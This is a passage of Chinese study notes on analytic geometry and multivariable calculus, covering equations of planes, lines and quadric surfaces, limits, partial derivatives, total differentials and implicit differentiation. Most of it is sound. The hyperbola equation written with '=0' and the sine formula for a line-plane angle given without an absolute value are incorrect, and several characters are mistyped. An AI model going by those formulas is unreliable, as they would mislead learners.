title="平面表示方法"></a>平面表示方法</h3><h4 id="点法式"><a href="#点法式" class="headerlink" title="点法式"></a>点法式</h4><p>如果一非零向量垂直于一平面，这向量就叫做该平面的<strong>法线向量</strong>。<br>因为过空间一点可以作而且只能作一平面垂直于一已知直线。<br><strong>点法式</strong>：平面上一点和平面的法线向量。</p><script type="math/tex; mode=display">A(x-x_0)+B(y-y_0)+C(z-z_0)=0,\overrightarrow{n}=(A,B,C),M=(x_0,y_0,z_0)</script><h4 id="一般方程"><a href="#一般方程" class="headerlink" title="一般方程"></a>一般方程</h4><script type="math/tex; mode=display">Ax+By+Cz+D=0, \overrightarrow{n}=(A,B,C)</script><p>$D=0$，表示平面过原点<br>$A,B,C=0$，分别表示$\overrightarrow{n}$与$x,y,z$轴垂直，即平面与$x,y,z$轴平行</p><h4 id="截距式方程"><a href="#截距式方程" class="headerlink" title="截距式方程"></a>截距式方程</h4><p>平面相交于坐标轴于$(a,0,0),(0,b,0),(0,0,c)$</p><script type="math/tex; mode=display">\frac{x}{a}+\frac{y}{b}+\frac{z}{c}=1</script><h4 id="几个小技巧"><a href="#几个小技巧" class="headerlink" title="几个小技巧"></a>几个小技巧</h4><p>已知三点$M_1,M_2,M_3$求平面方程<br>平面任意一点$M$应该满足$M_1M\cdot (M_1M_2\times M_1M_3)=0$，也就是跟混合积很像的东西了</p><script type="math/tex; mode=display">\left|\begin{matrix}x-x_1&  y-y_1& z-z_1\\  x_2-x_1& y_2-y_1 & z_2-z_1 \\ x_3-x_1& y_3-y_1 & z_3-z_1 \end{matrix}\right|=0</script><h3 id="夹角"><a href="#夹角" class="headerlink" title="夹角"></a>夹角</h3><h4 id="两平面夹角"><a href="#两平面夹角" class="headerlink" title="两平面夹角"></a>两平面夹角</h4><p>两平面的法线向量的夹角（通常指锐角或直角）称为<strong>两平面的夹角</strong>。</p><script type="math/tex; mode=display">\cos\theta=\frac{|A_1A_2+B_1B_2+C_1C_2|}{\sqrt{A_1^2+B_1^2+C_1^2}\sqrt{A_2^2+B_2^2+C_2^2}}</script><p>两平面$\prod_1,\prod_2$互相垂直$A_1A_2+B_1B_2+C_1C_2=0$<br>两平面$\prod_1,\prod_2$互相平行或重合$\frac{A_1}{A_2}=\frac{B_1}{B_2}=\frac{C_1}{C_2}$</p><h4 id="点到平面距离"><a href="#点到平面距离" class="headerlink" title="点到平面距离"></a>点到平面距离</h4><p>$P_0$到平面$Ax+By+Cz+D=0$距离，任取一点$P_1$</p><script type="math/tex; mode=display">d=|\overrightarrow{P_0P_1}||\cos\theta|=\frac{|\overrightarrow{P_0P_1}\cdot n|}{|n|}=\frac{|Ax_0+By_0+Cz_0+D|}{\sqrt{A^2+B^2+C^2}}</script><h3 id="直线表示方法"><a href="#直线表示方法" class="headerlink" title="直线表示方法"></a>直线表示方法</h3><h4 id="一般方程-1"><a href="#一般方程-1" class="headerlink" title="一般方程"></a>一般方程</h4><script type="math/tex; mode=display">\left\{\begin{matrix}A_1x+B_1y+C_1z+D_1=0\\ A_2x+B_2y+C_2z+D_2=0\end{matrix}\right.</script><h4 id="对称式方程-点向式方程"><a href="#对称式方程-点向式方程" class="headerlink" title="对称式方程 || 点向式方程"></a>对称式方程 || 点向式方程</h4><p>如果一个非零向量平行于一条已知直线，那么这个向量就叫做这条直线的方向向量。<br>过空间一点可作而且只能作一条直线平行于一已知直线。<br>已知直线$L$上一点$M_0$，和它一方向向量$s=(m,n,p)$<br>对于直线$L$任意一点$M$，$\overrightarrow{MM_0}=(x-x_0,y-y_0,z-z_0)$，有</p><script type="math/tex; mode=display">\frac{x-x_0}{m}=\frac{y-y_0}{n}=\frac{z-z_0}{p}</script><p>此方程组便是直线$L$的方程，叫做直线的<strong>对称式方程</strong>或<strong>点向式方程</strong><br>任一方向向量$s$的坐标$m,n,p$叫做这直线的一组<strong>方向数</strong>，而向量$s$的方向余弦叫做该直线的<strong>方向余弦</strong></p><h4 id="参数方程"><a href="#参数方程" class="headerlink" title="参数方程"></a>参数方程</h4><p>由直线的对称式方程，设</p><script type="math/tex; mode=display">\frac{x-x_0}{m}=\frac{y-y_0}{n}=\frac{z-z_0}{p}=t</script><p>则，直线的参数方程</p><script type="math/tex; mode=display">\left\{\begin{matrix}x=x_0+mt\\ y=y_0+nt\\z=z_0+pt\end{matrix}\right.</script><h4 id="两直线的夹角"><a href="#两直线的夹角" class="headerlink" title="两直线的夹角"></a>两直线的夹角</h4><p>两直线的方向向量的夹角（通常指锐角或直角）叫做<strong>两直线的夹角</strong>。<br>设直线$L_1,L_2$方向向量$s_1=(m_1,n_1,p_1),s_2=(m_2,n_2,p_2)$，则夹角$\varphi$.</p><script type="math/tex; mode=display">\cos\varphi=\frac{|m_1m_2+n_1n_2+p_1p_2|}{\sqrt{m_1^2+n_1^2+p_1^2}\sqrt{m_2^2+n_2^2+p_2^2}}</script><p>两直线$L_1,L_2$互相垂直$m_1m_2+n_1n_2+p_1p_2=0$<br>两直线$L_1,L_2$互相平行或重合$\frac{m_1}{m_2}=\frac{n_1}{n_2}=\frac{p_1}{p_2}$</p><h4 id="直线与平面的夹角"><a href="#直线与平面的夹角" class="headerlink" title="直线与平面的夹角"></a>直线与平面的夹角</h4><p>当直线与平面不垂直是直线和它在平面上的投影直线的夹角$\varphi(0\leqslant \varphi &lt; \frac{\pi}{2})$，称为<strong>直线与平面的夹角</strong>，当直线与平面垂直时，规定直线与平面的夹角为$\frac{\pi}{2}$<br>设直线方向向量$s=(m,n,p)$，平面法线向量$n=(A,B,C)$，直线与平面夹角$\varphi$.</p><script type="math/tex; mode=display">sin\varphi =\frac{Am+Bn+Cp}{\sqrt{A^2+B^2+C^2}\sqrt{m^2+n^2+p^2}}</script><p>直线与平面垂直$\frac{A}{m}=\frac{B}{n}=\frac{C}{p}$<br>直线与平面平行或在平面上$Am+Bn+Cp=0$</p><h4 id="平面束方程"><a href="#平面束方程" class="headerlink" title="平面束方程"></a>平面束方程</h4><p>直线$L$.</p><script type="math/tex; mode=display">\left\{\begin{matrix}A_1x+B_1y+C_1z+D_1=0\\ A_2x+B_2y+C_2z+D_2=0\end{matrix}\right.</script><p>方程$A_1x+B_1y+C_1z+D_1+\lambda (A_2x+B_2y+C_2z+D_2)=0$，能表示所有经过直线的平面，除了方程中第二个平面。<br>通过定直线的所有平面的全体称为<strong>平面束</strong>。</p><h4 id="直线与平面的交点"><a href="#直线与平面的交点" class="headerlink" title="直线与平面的交点"></a>直线与平面的交点</h4><p>解法一：将直线转化成参数方程，带入平面方程。<br>解法二：求解三元一次方程。</p><h4 id="点到直线的距离"><a href="#点到直线的距离" class="headerlink" title="点到直线的距离"></a>点到直线的距离</h4><p>解法一：计算直线的方向向量，任取直线上一点，造一个三角形来计算夹角正弦。<br>解法二：计算直线的方向向量，做过定点以直线方向向量为法向量的平面方程，将直线转化成参数方程求交点，最后求两点距离。<br>解法三：$d=\frac{|P_0P\times s|}{|s|}$</p><h4 id="点到平面的投影"><a href="#点到平面的投影" class="headerlink" title="点到平面的投影"></a>点到平面的投影</h4><p>由定点和平面法向量确定一条直线，用直线参数方程求交点。</p><h4 id="直线到平面的投影"><a href="#直线到平面的投影" class="headerlink" title="直线到平面的投影"></a>直线到平面的投影</h4><p>解法一：用平面束方程，再由两平面垂直可以得到过直线且垂直于已知平面的平面方程，联立即可得到投影方程。<br>解法二：求法向量和直线与平面的交点再加直线的一个点，确定垂直于已知平面的平面，联立即可得到投影方程。</p><h3 id="曲面及其方程"><a href="#曲面及其方程" class="headerlink" title="曲面及其方程"></a>曲面及其方程</h3><h4 id="球面"><a href="#球面" class="headerlink" title="球面"></a>球面</h4><script type="math/tex; mode=display">(x-x_0)^2+(y-y_0)^2+(z-z_0)^2=R^2</script><script type="math/tex; mode=display">Ax^2+Ay^2+Az^2+Dx+Ey+Fz+G=0</script><h4 id="旋转曲面"><a href="#旋转曲面" class="headerlink" title="旋转曲面"></a>旋转曲面</h4><p>以一条平面曲线绕其平面上的一条直线旋转一周所成的曲面叫做<strong>旋转曲面</strong>，旋转曲线和定直线依次叫做旋转曲面的<strong>母线</strong>和<strong>轴</strong></p><p>直线$L$绕另一条与$L$相交的直线旋转一周，所得旋转曲面叫做<strong>圆锥面</strong>。两直线的交点叫做圆锥的<strong>顶点</strong>，两直线的夹角$\alpha (0&lt;\alpha &lt;\frac{\pi}{2})$叫做圆锥面的<strong>半顶角</strong>。</p><p>对于绕$z$轴的曲线，原曲线$f(y,z)=0$，旋转后$f(\pm \sqrt{x^2+y^2},z)=0$</p><h4 id="圆锥面"><a href="#圆锥面" class="headerlink" title="圆锥面"></a>圆锥面</h4><script type="math/tex; mode=display">z=\pm \sqrt{x^2+y^2} \cot \alpha</script><h4 id="旋转双曲面"><a href="#旋转双曲面" class="headerlink" title="旋转双曲面"></a>旋转双曲面</h4><p>$xOz$平面上的方程$\frac{x^2}{a^2}-\frac{z^2}{c^2}=0$<br>绕$z$轴旋转所成的旋转曲面叫做<strong>旋转单叶双曲面</strong>，绕$x$轴旋转所成的旋转曲面叫做<strong>旋转双叶双曲面</strong>。</p><h4 id="柱面"><a href="#柱面" class="headerlink" title="柱面"></a>柱面</h4><p>如$x^2+y^2=R^2$，不含$z$坐标，可以看做是由平行于$z$轴的直线$l$沿$xOy$面上的圆移动而形成的，这曲面叫做<strong>圆柱面</strong>,$xOy$面上的圆$x^2+y^2=R^2$叫做它的<strong>准线</strong>，这平行于$z$轴的直线$l$叫做它的<strong>母线</strong>。</p><p>一般地，直线$L$沿定曲线$C$平行移动形成的轨迹叫做<strong>柱面</strong>，定直线$C$叫做柱面的<strong>准线</strong>，动直线<script type="math/tex">L</script>叫做柱面的<strong>母线</strong>。</p><p>类似地，方程$y^2=2x$表示母线平行于$z$轴的柱面他的准线是$xOy$面上的抛物线，该柱面叫做<strong>抛物柱面</strong>。</p><h4 id="二次曲面"><a href="#二次曲面" class="headerlink" title="二次曲面"></a>二次曲面</h4><p>把三元二次方程$F(x,y,z)=0$所表示的曲面称为<strong>二次曲面</strong>，把平面称为<strong>一次曲面</strong>。</p><ol><li><p>椭圆锥面 $\frac{x^2}{a^2}+\frac{y^2}{b^2}=z^2$<br>以垂直于$z$轴的平面$z=t$截此平面，$t=0$时得一点$(0,0,0)$；$t\neq 0$时得椭圆$\frac{x^2}{(at)^2}+\frac{y^2}{(bt)^2}=1$<br>平面$z=t$与曲面$F(x,y,z)=0$的交线称为<strong>截痕</strong>，通过综合截痕的变化来了解曲面形状的方法称为<strong>截痕法</strong>。</p></li><li><p>椭球面 $\frac{x^2}{a^2}+\frac{y^2}{b^2}+\frac{z^2}{c^2}=1$<br>把$xOz$面上的椭圆$\frac{x^2}{a^2}+\frac{z^2}{c^2}=1$绕$z$轴旋转，所得曲面称为<strong>旋转椭球面</strong>，其方程为$\frac{x^2+y^2}{a^2}+\frac{z^2}{c^2}=1$，再把旋转椭球面沿$y$轴方向伸缩$\frac{b}{a}$倍，便得椭球面。</p></li><li><p>单叶双曲面 $\frac{x^2}{a^2}+\frac{y^2}{b^2}-\frac{z^2}{c^2}=1$<br>把$xOz$面上的双曲线$\frac{x^2}{a^2}-\frac{z^2}{c^2}=1$绕$z$轴旋转得到旋转单叶双曲面$\frac{x^2+y^2}{a^2}-\frac{z^2}{c^2}=1$，再沿$y$轴方向伸缩$\frac{b}{a}$得到。</p></li><li><p>双叶双曲面 $\frac{x^2}{a^2}-\frac{y^2}{b^2}-\frac{z^2}{c^2}=1$<br>把$xOz$面上的双曲线$\frac{x^2}{a^2}-\frac{z^2}{c^2}=1$绕$x$轴旋转得到旋转双叶双曲面$\frac{x^2}{a^2}-\frac{y^2+z^2}{c^2}=1$，再沿$y$轴方向伸缩$\frac{b}{c}$得到。</p></li><li><p>椭圆抛物面 $\frac{x^2}{a^2}+\frac{y^2}{b^2}=z$<br>把$xOz$面上的抛物线$\frac{x^2}{a^2}=z$绕$z$轴旋转，所得的曲面叫做<strong>旋转抛物面</strong>，再沿$y$轴方向伸缩$\frac{b}{a}$倍</p></li><li><p>双曲抛物面 $\frac{x^2}{a^2}-\frac{y^2}{b^2}=z$<br>双曲抛物面又称<strong>马鞍面</strong><br>用$x=t$截此平面，截痕为$l$，轨迹为$L$，双曲抛物面母线为$l$，$L$为准线。</p></li></ol><p>还有三种二次曲面椭圆柱面$\frac{x^2}{a^2}+\frac{y^2}{b^2}=1$，双曲柱面$\frac{x^2}{a^2}-\frac{y^2}{b^2}=1$，抛物柱面$x^2=ay$</p><h3 id="空间曲线及其方程"><a href="#空间曲线及其方程" class="headerlink" title="空间曲线及其方程"></a>空间曲线及其方程</h3><h4 id="空间曲线的一般方程"><a href="#空间曲线的一般方程" class="headerlink" title="空间曲线的一般方程"></a>空间曲线的一般方程</h4><p>空间曲线可以看做两个曲面的交线，则方程组</p><script type="math/tex; mode=display">\left\{\begin{matrix}F(x,y,z)=0\\G(x,y,z)=0 \end{matrix}\right.</script><p>是两个曲面交线的方程，也叫做空间曲线的一般方程。</p><h4 id="空间曲线的参数方程"><a href="#空间曲线的参数方程" class="headerlink" title="空间曲线的参数方程"></a>空间曲线的参数方程</h4><p>将空间曲线$C$上动点的坐标$x,y,z$表示为参数$t$的函数</p><script type="math/tex; mode=display">\left\{\begin{matrix}x=x(t)\\y=y(t)\\z=z(t) \end{matrix}\right.</script><p>当给定$t=t_1$时，就得到$C$上的一个点$(x_1,y_1,z_1)$；随着$t$的变动便可得到曲线$C$上的全部点，方程组叫做空间曲线的参数方程。</p><h4 id="螺旋线"><a href="#螺旋线" class="headerlink" title="螺旋线"></a>螺旋线</h4><p>若空间一个点$M$在圆柱面$x^2+y^2=a^2$上以角速度$\omega $绕$z$轴旋转，同时又以线速度$v$沿平行于$z$轴正方向上升，那么$M$构成的图形叫做<strong>螺旋线</strong>。</p><script type="math/tex; mode=display">\left\{\begin{matrix}x=a\cos\theta\\y=a\sin\theta\\z=b\theta \end{matrix}\right.,b=\frac{v}{\omega}</script><p>其中，参数为$\theta$，$h=2\pi b$称为螺距，即旋转一周上升的距离</p><h4 id="曲面参数方程"><a href="#曲面参数方程" class="headerlink" title="曲面参数方程"></a>曲面参数方程</h4><script type="math/tex; mode=display">\left\{\begin{matrix}x=x(s,t)\\y=y(s,t)\\z=z(s,t) \end{matrix}\right.</script><h4 id="空间曲线在坐标面上的投影"><a href="#空间曲线在坐标面上的投影" class="headerlink" title="空间曲线在坐标面上的投影"></a>空间曲线在坐标面上的投影</h4><p>以曲线$C$为准线、母线平行于$z$轴的柱面叫做曲线$C$关于$xOy$面的<strong>投影柱面</strong>，投影柱面与$xOy$面的交线叫做空间曲线$C$在$xOy$面上的<strong>投影曲线</strong>，简称<strong>投影</strong>。<br>即在$xOy$面上的投影</p><script type="math/tex; mode=display">\left\{\begin{matrix}H(x,y)=0\\z=0 \end{matrix}\right.</script><h2 id="第九章-多元函数微分法及其应用"><a href="#第九章-多元函数微分法及其应用" class="headerlink" title="第九章 多元函数微分法及其应用"></a>第九章 多元函数微分法及其应用</h2><h3 id="多元函数基本概念"><a href="#多元函数基本概念" class="headerlink" title="多元函数基本概念"></a>多元函数基本概念</h3><h4 id="平面点集"><a href="#平面点集" class="headerlink" title="平面点集"></a>平面点集</h4><p>设$P_0(x_0,y_0)$是$xOy$平面上的一个点，$\delta $是某一正数。与点$P_0(x_0,y_0)$距离小于$\delta $的点$P(x,y)$的全体，称为点$P_0$的$\delta$<strong>邻域</strong>，记作$U(P_0,\delta )$，即$U(P_0,\delta )=\{P||PP_0|&lt;\delta\}$，点$P_0$的去心$\delta$邻域$\overset{\circ}{U}(P_0,\delta )=\{P|0&lt;|PP_0|&lt;\delta\}$</p><h4 id="利用邻域描述点和点集之间的关系"><a href="#利用邻域描述点和点集之间的关系" class="headerlink" title="利用邻域描述点和点集之间的关系"></a>利用邻域描述点和点集之间的关系</h4><p>任意一点$P\in R^2$与任意一个点集$E\subset R^2$之间必有以下三种关系的一种</p><ul><li>内点：如果存在点$P$的某个邻域$U(P)$，使得$U(P)\subset E$，那么称$P$为$E$的内点</li><li>外点：如果存在点$P$的某个邻域$U(P)$，使得$U(P)\cap E=\varnothing$，那么称$P$为$E$的外点</li><li><p>边界点：如果点$P$的任一邻域内既含有属于$E$的点，又含有不属于$E$的点，那么称$P$为$E$的边界点。<br>$E$的边界点的全体，称为$E$的边界，记作$\partial E$<br>$E$的内点必属于$E$；$E$的外点必定不属于$E$；而$E$的边界点可能属于$E$，也可能不属于$E$。</p></li><li><p>聚点：如果对于任意给定的$\delta &gt;0$，点$P$的去心邻域$\overset{\circ}{U}(P,\delta)$内总有$E$种的点，那么称$P$是$E$的聚点。</p></li></ul><h4 id="重要的平面点集"><a href="#重要的平面点集" class="headerlink" title="重要的平面点集"></a>重要的平面点集</h4><ul><li>开集：如果点集$E$的点都是$E$的内点，那么称$E$为<strong>开集</strong>。</li><li>闭集：如果点集$E$的边界$\partial E\subset E$，那么称$E$为<strong>闭集</strong>。</li><li>连通集：如果点集$E$内任何两点，都可用折线联结起来，且该折线上的点都属于$E$，那么称$E$为<strong>连通集</strong></li><li>区域（或开区域）：连通的开集称为<strong>区域</strong>或<strong>开区域。</strong></li><li>闭区域：开区域连同它的边界一起所构成的点集称为<strong>闭区域</strong>。</li><li>有界集：对于平面点集$E$，如果存在某一正数$r$，使得$E\subset U(O,r)$，其中$O$是坐标原点，那么称$E$为<strong>有界集</strong>。</li><li>无界集：一个集合如果不是有界集，就称这个集合为<strong>无界集</strong>。</li></ul><h4 id="多元函数概念"><a href="#多元函数概念" class="headerlink" title="多元函数概念"></a>多元函数概念</h4><p>定义：设$D$是$R^2$的一个非空子集，称映射$f:D\rightarrow R$为定义在$D$上的<strong>二元函数</strong>，通常记为$z=f(x,y),(x,y)\in D$ 或 $z=f(P),P\in D$，其中点集$D$称为该函数的<strong>定义域</strong>，$x,y$称为<strong>自变量</strong>，$z$称为<strong>因变量</strong>。<br>函数值$f(x,y)$的全体所构成的集合称为函数$f$的<strong>值域</strong>，记作$f(D)$。<br>类似的$n$元函数，$u=f(x_1,x_2,…,x_n),(x_1,x_2,…,x_n)\in D$ 或简记为 $u=f(x),x=(x_1,x_2,…,x_n)\in D$，也可记为$u=f(P),P(x_1,x_2,…,x_n)\in D$<br>$n=1$时，$n$元函数就是一元函数；$n\geqslant 2$时，$n$元函数统称为<strong>多元函数</strong>。<br>讨论多元函数$u=f(x)$时，以使这个算式有意义的变元$x$的值所组成的点集为这个<strong>多元函数的自然定义域</strong>。<br>$\{(x,y,z)|z=f(x,y),(x,y)\in D\}$这个点集称为二元函数$z=f(x,y)$的<strong>图形</strong>。</p><h4 id="多元函数的基线"><a href="#多元函数的基线" class="headerlink" title="多元函数的基线"></a>多元函数的基线</h4><p>定义：设二元函数$f(P)=f(x,y)$的定义域为$D$，$P_0(x_0,y_0)$是$D$的聚点，如果存在常数$A$，对于任意给定的正数$\varepsilon$，总存在正数$\delta$，使得当点$P(x,y)\in D \cap \overset{\circ}{U}(P_0,\delta)$时，都有$|f(P)-A|=|f(x,y)-A|&lt;\varepsilon$成立，那么就称常数$A$为函数$f(x,y)$当$(x,y)\rightarrow (x_0,y_0)$时的极限，记作$\lim_{(x,y)\rightarrow (x_0,y_0)}f(x,y)=A$ 或 $f(x,y)\rightarrow A((x,y)\rightarrow (x_0,y_0))$，也记作$\lim_{P\rightarrow P_0}f(P)=A$ 或 $f(P)\rightarrow A(P\rightarrow P_0)$<br>把二元函数的极限叫做<strong>二重极限</strong>。</p><h4 id="多元函数的连续性"><a href="#多元函数的连续性" class="headerlink" title="多元函数的连续性"></a>多元函数的连续性</h4><p>定义：设二元函数$f(P)=f(x,y)$的定义域为$D$，$P_0(x_0,y_0)$为$D$的聚点，且$P_0\in D$。如果$\lim_{(x,y)\rightarrow (x_0,y_0)}f(x,y)=f(x_0,y_0)$，那么称函数$f(x,y)$在点$P_0(x_0,y_0)$连续。<br>设函数$f(x,y)$在$D$上有定义，$D$内的每一个点都是函数定义域的聚点。如果函数$f(x,y)$在$D$的每一点都连续，那么就称函数$f(x,y)$在$D$上连续，或者乘$f(x,y)$是$D$上的<strong>连续函数</strong>。</p><p>定义：设二元函数$f(P)=f(x,y)$的定义域为$D$，$P_0(x_0,y_0)$为$D$的聚点。如果函数$f(x,y)$在点$P_0(x_0,y_0)$不连续，那么称$P_0(x_0,y_0)$为函数$f(x,y)$的间断点。</p><p>一切多元初等函数在其定义区域内是连续的，所谓定义区域是指包含在定义域内的区域或闭区域。</p><p>性质1（有界性与最大值最小值定理） 在有界闭区域$D$上的多元连续函数，必定在$D$上有界，且能取得它的最大值和最小值。<br>性质2（介值定理） 在有界闭区域$D$上的多元连续函数必取得介于最大值和最小值之间的任何值。<br>性质3（一致连续性定理） 在有界闭区域$D$上的多元连续函数必定在$D$上一致连续。</p><h3 id="偏导数"><a href="#偏导数" class="headerlink" title="偏导数"></a>偏导数</h3><h4 id="偏导数定义及其计算法"><a href="#偏导数定义及其计算法" class="headerlink" title="偏导数定义及其计算法"></a>偏导数定义及其计算法</h4><p>定义： 设函数$z=f(x,y)$在点$(x_0,y_0)$的某一邻域内有定义，当$y$固定在$y_0$而$x$在$x_0$处有增量$\Delta x$时，相应的函数有增量$f(x_0+\Delta x,y_0)-f(x_0,y_0)$，如果$\lim_{\Delta x\rightarrow 0}\frac{f(x_0+\Delta x,y_0)-f(x_0,y_0)}{\Delta x}$存在，那么称此极限为函数$z=f(x,y)$在点$(x_0,y_0)$处对$x$的偏导数，记作</p><script type="math/tex; mode=display">\left .\frac{\partial z}{\partial x} \right |_ {\begin{matrix}x=x_0\\y=y_0\end{matrix}},\left .\frac{\partial f}{\partial x} \right |_ {\begin{matrix}x=x_0 \\ y=y_0\end{matrix}},\left . z_x\right |_ {\begin{matrix}x=x_0\\y=y_0\end{matrix}},f_x(x_0,y_0)</script><p>对于多元函数来书豪，即使各偏导数在某点都存在，也不能保证函数在该点连续。</p><h4 id="高阶偏导数"><a href="#高阶偏导数" class="headerlink" title="高阶偏导数"></a>高阶偏导数</h4><p>设函数$z=f(x,y)$在区域$D$内具有偏导数</p><script type="math/tex; mode=display">\frac{\partial z}{\partial x}=f_x(x,y),\frac{\partial z}{\partial y}=f_y(x,y)</script><p>于是在$D$内$f_x(x,y),f_y(x,y)$都是$x,y$的函数，如果这两个函数的偏导数也存在，那么称它们是函数$z=f(x,y)$的二阶偏导数，按照对变量求导次序的不同有下列四个二阶偏导数：</p><script type="math/tex; mode=display">\begin{matrix}\frac{\partial}{\partial x}\left (\frac{\partial z}{\partial x}\right )=\frac{\partial^2 z}{\partial x^2}=f_{xx}(x,y),\frac{\partial}{\partial y}\left (\frac{\partial z}{\partial x}\right )=\frac{\partial^2 z}{\partial x\partial y}=f_{xy}(x,y)\\ \frac{\partial}{\partial x}\left (\frac{\partial z}{\partial y}\right )=\frac{\partial^2 z}{\partial y\partial x}=f_{yx}(x,y),\frac{\partial}{\partial y}\left (\frac{\partial z}{\partial y}\right )=\frac{\partial^2 z}{\partial y^2}=f_{yy}(x,y)\end{matrix}</script><p>其中第二、三两个偏导数称为<strong>混合偏导数</strong>。<br>二阶及二阶以上的偏导数统称为<strong>高阶偏导数</strong>。</p><p>定理：如果函数$z=f(x,y)$的两个二阶混合偏导数$\frac{\partial ^2 z}{\partial y\partial x},\frac{\partial ^2z}{\partial x\partial y}$在区域$D$内连续，那么在该区域内这两个二阶混合偏导数必相等，换句话说，二阶混合偏导数在连续的条件下与求导的次序壶关。</p><h3 id="全微分"><a href="#全微分" class="headerlink" title="全微分"></a>全微分</h3><h4 id="全微分定义"><a href="#全微分定义" class="headerlink" title="全微分定义"></a>全微分定义</h4><script type="math/tex; mode=display">f(x+\Delta x,y)-f(x,y)\approx f_x(x,y)\Delta x</script><script type="math/tex; mode=display">f(x,y+\Delta y)-f(x,y)\approx f_y(x,y)\Delta y</script><p>左端分别叫做二元函数对$x$和对$y$的<strong>偏增量</strong>，而右端分别叫做二元函数对$x$和对$y$的<strong>偏微分</strong>。<br>在点$P(x,y)$对应于自变量的增量$\Delta x,\Delta y$的<strong>全增量</strong>，记作$\Delta z$，即$\Delta z=f(x+\Delta,y+\Delta)-f(x,y)$</p><p>定义：设函数$z=f(x,y)$在点$(x,y)$的某邻域内有定义，如果函数在点$(x,y)$的全增量$\Delta z=f(x+\Delta,y+\Delta)-f(x,y)$，可表示为$\Delta z=A\Delta x+B\Delta y+o(\rho)$，其中$A$和$B$不依赖于$\Delta x$和$\Delta y$而仅与$x$和$y$有关，$\rho =\sqrt{(\Delta x)^2+(\Delta y)^2}$，那么称函数$z=f(x,y)$在点$(x,y)$<strong>可微分</strong>，而$A\Delta x+B\Delta y$称为函数$z=f(x,y)$在点$(x,y)$的<strong>全微分</strong>，记作$\text{d} z$，即$\text{d} z=A\Delta x+B\Delta y$</p><p>在某点可微分，必定连续</p><p>定理1（必要条件） 如果函数$z=f(x,y)$在点$(x,y)$可微分，那么该函数在点$(x,y)$的偏导数$\frac{\partial z}{\partial x}$与$\frac{\partial z}{\partial y}$必定存在，且函数$z=f(x,y)$在点$(x,y)$的全微分为</p><script type="math/tex; mode=display">\text{d} z=\frac{\partial z}{\partial x}\Delta x+\frac{\partial z}{\partial y}\Delta y</script><p>定理2（充分条件） 如果函数$z=f(x,y)$的偏导数$\frac{\partial z}{\partial x}$与$\frac{\partial z}{\partial y}$在点$(x,y)$连续，那么函数在该点可微分。</p><p>通常把二元函数的全微分等于它的两个偏微分之和这件事称为二元函数的微分符合<strong>叠加原理</strong>。</p><h3 id="多元函数求导法则"><a href="#多元函数求导法则" class="headerlink" title="多元函数求导法则"></a>多元函数求导法则</h3><p>懒得打那么多了…</p><script type="math/tex; mode=display">\frac{\partial z}{\partial x}=\frac{\partial z}{\partial u}\frac{\partial u}{\partial x}+\frac{\partial z}{\partial v}\frac{\partial v}{\partial x}</script><p>注意一下是$\partial$还是$\text{d}$就行了<br>这也叫做<strong>全导数</strong></p><p>无论$u$和$v$是自变量还是中间变量，函数$z=f(u,v)$的全微分形式是一样的，这个性质叫做<strong>全微分形式不变性</strong>。</p><h3 id="隐函数求导公式"><a href="#隐函数求导公式" class="headerlink" title="隐函数求导公式"></a>隐函数求导公式</h3><h4 id="一个方程的情况"><a href="#一个方程的情况" class="headerlink" title="一个方程的情况"></a>一个方程的情况</h4><p>同上…懒得打太详细</p><script type="math/tex; mode=display">\frac{\text{d} y}{\text{d} x}=-\frac{F_x}{F_y}</script><script type="math/tex; mode=display">\frac{\partial z}{\partial x}=-\frac{F_x}{F_z},\frac{\partial z}{\partial y}=-\frac{F_y}{F_z}</script><h4 id="方程组的情况"><a href="#方程组的情况" class="headerlink" title="方程组的情况"></a>方程组的情况</h4><p>隐函数存在定理3 设$F(x,y,u,v),G(x,y,u,v)$在点$P(x_0,y_0,u_0,v_0)$的某一邻域内具有各个变量的连续偏导数，又$F(x_0,y_0,u_0,v_0)=0,G(x_0,y_0,u_0,v_0)=0$，且偏导数所组成的函数行列式（或称雅可比(Jacobi)式）</p><script type="math/tex; mode=display">J=\frac{\partial(F,G)}{\partial(u,v)}=\begin{vmatrix}\frac{\partial F}{\partial u} &\frac{\partial F}{\partial v} \\ \frac{\partial G}{\partial u} &\frac{\partial G}{\partial v} \end{vmatrix}</script><p>在点$P(x_0,y_0,u_0,v_0)$不等于零，而方程组$F(x_0,y_0,u_0,v_0)=0,G(x_0,y_0,u_0,v_0)=0$在点$P(x_0,y_0,u_0,v_0)$的某一邻域内恒能唯一确定一组连续且具有连续偏导数的函数$u=u(x,y),v=v(x,y)$，它们满足条件$u_0=u(x,y),v_0=v(x,y)$，并有</p><script type="math/tex; mode=display">\frac{\partial u}{\partial x}=-\frac{1}{J}\frac{\partial(F,G)}{\partial(x,v)}=-\frac{\begin{vmatrix} F_x &F_v \\ G_x &G_v \end{vmatrix}}{\begin{vmatrix}F_u &F_v \\ G_u &G_v \end{vmatrix}}</script><script type="math/tex; mode=display">\frac{\partial v}{\partial x}=-\frac{1}{J}\frac{\partial(F,G)}{\partial(u,x)}=-\frac{\begin{vmatrix} F_u &F_x \\ G_u &G_x \end{vmatrix}}{\begin{vmatrix}F_u &F_v \\ G_u &G_v \end{vmatrix}}</script><script type="math/tex; mode=display">\frac{\partial u}{\partial y}=-\frac{1}{J}\frac{\partial(F,G)}{\partial(y,v)}=-\frac{\begin{vmatrix} F_y &F_v \\ G_y &G_v \end{vmatrix}}{\begin{vmatrix}F_u &F_v \\ G_u &G_v \end{vmatrix}}</script><script type="math/tex; mode=display">\frac{\partial v}{\partial y}=-\frac{1}{J}\frac{\partial(F,G)}{\partial(u,y)}=-\frac{\begin{vmatrix} F_u &F_y \\ G_u &G_y \end{vmatrix}}{\begin{vmatrix}F_u &F_v \\ G_u &G_v \end{vmatrix}}</script><h3 id="多元函数微分学的几何应用"><a href="#多元函数微分学的几何应用" class="headerlink" title="多元函数微分学的几何应用"></a>多元函数微分学的几何应用</h3><h4 id="一元向量值函数及其导数"><a href="#一元向量值函数及其导数" class="headerlink" title="一元向量值函数及其导数"></a>一元向量值函数及其导数</h4><p>定义1 设数集$D\subset R$，则称映射$f:D\rightarrow R^n$为<strong>一元向量值函数</strong>，通常记为$r=f(t),t\in D$，其中数集$D$称为函数的定义域，$t$称为自变量，$r$称为因变量。</p><p>定义2 设向量值函数$f(t)$在点$t_0$的某一去心邻域内有定义，如果存在一个常向量$r_0$，对于任意给定的正数$\varepsilon $，总存在正数$\delta $，使得当$t$满足$0&lt;|t-t_0|&lt;\delta $时，对应的函数值$f(t)$都满足不等式$|f(t)-r_0|&lt;\varepsilon$，那么，常向量$r_0$就叫做向量值函数$f(t)$当$t\rightarrow t_0$时的极限，记作$\lim_{t\rightarrow 